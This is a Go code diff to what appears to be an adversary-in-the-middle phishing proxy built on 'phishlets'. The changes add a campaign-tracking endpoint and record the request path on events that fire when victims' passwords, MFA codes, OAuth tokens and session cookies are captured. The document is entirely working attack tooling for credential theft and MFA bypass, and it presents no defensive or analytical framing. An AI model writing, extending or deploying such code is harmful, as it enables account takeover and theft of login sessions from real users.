@@ -34,6 +34,7 @@ type Engine struct {
 	upstream map[string]string // origHost -> baseURL override (e2e/lab)
 	transport http.RoundTripper
 	fp       http.Handler
+	track    http.Handler
 }
 
 // Limiter — rate-limit интерфейс (реализация internal/ratelimit).
@@ -69,9 +70,16 @@ func (e *Engine) SetTransport(rt http.RoundTripper) { e.transport = rt }
 // SetChallenge — fingerprint challenge /__fp/* (обслуживается локально, не проксируется).
 func (e *Engine) SetChallenge(h http.Handler) { e.fp = h }
 
+// SetTracker — трекинг кампании /__tr/* (обслуживается локально, не проксируется).
+func (e *Engine) SetTracker(h http.Handler) { e.track = h }
+
 func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	if e.fp != nil && strings.HasPrefix(r.URL.Path, "/__fp/") {
 		e.fp.ServeHTTP(w, r)
+		return
+	}
+	if e.track != nil && strings.HasPrefix(r.URL.Path, "/__tr/") {
+		e.track.ServeHTTP(w, r)
 		return
 	}
 	ph, host := e.store.FindByHost(r.Host)
@@ -144,10 +152,10 @@ func (e *Engine) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 				r.ContentLength = int64(len(body))
 				bs := string(body)
 				if captured(ph, bs) && e.bus != nil {
-					_ = e.bus.Publish(r.Context(), "capture.creds", map[string]string{"session": sid, "phishlet": ph.ID, "ip": ip})
+					_ = e.bus.Publish(r.Context(), "capture.creds", map[string]string{"session": sid, "phishlet": ph.ID, "ip": ip, "path": r.URL.Path})
 				}
 				if key := capturedMFA(ph, bs); key != "" && e.bus != nil {
-					_ = e.bus.Publish(r.Context(), "capture.mfa", map[string]string{"session": sid, "phishlet": ph.ID, "kind": key, "ip": ip})
+					_ = e.bus.Publish(r.Context(), "capture.mfa", map[string]string{"session": sid, "phishlet": ph.ID, "kind": key, "ip": ip, "path": r.URL.Path})
 				}
 			}
 		}
@@ -242,7 +250,7 @@ func scanLocation(resp *http.Response, ph *core.Phishlet, bus core.EventBus, r *
 	ip := remoteIP(r)
 	check := func(key string) {
 		if strings.Contains(lowl, strings.ToLower(key)) {
-			_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": "location", "ip": ip})
+			_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": key, "via": "location", "ip": ip, "path": r.URL.Path})
 		}
 	}
 	for _, k := range oauthKeys {
@@ -265,14 +273,14 @@ func scanJSON(ct string, body []byte, ph *core.Phishlet, bus core.EventBus, r *h
 	hit := func(key string) bool { return strings.Contains(low, strings.ToLower(key)) }
 	for _, k := range oauthKeys {
 		if hit(strings.TrimSuffix(k, "=")) {
-			_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": strings.TrimSuffix(k, "="), "via": "json", "ip": ip})
+			_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": strings.TrimSuffix(k, "="), "via": "json", "ip": ip, "path": r.URL.Path})
 			return
 		}
 	}
 	for _, t := range ph.AuthTokens {
 		for _, k := range t.Keys {
 			if hit(k) {
-				_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "via": "json", "ip": ip})
+				_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "via": "json", "ip": ip, "path": r.URL.Path})
 				return
 			}
 		}
@@ -287,7 +295,7 @@ func markTokens(resp *http.Response, ph *core.Phishlet, bus core.EventBus, r *ht
 		for _, t := range ph.AuthTokens {
 			for _, k := range t.Keys {
 				if strings.Contains(setCookie, k+"=") {
-					_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "ip": remoteIP(r)})
+					_ = bus.Publish(r.Context(), "capture.token", map[string]string{"session": sid, "key": k, "ip": remoteIP(r), "path": r.URL.Path})
 					return
 				}
 			}
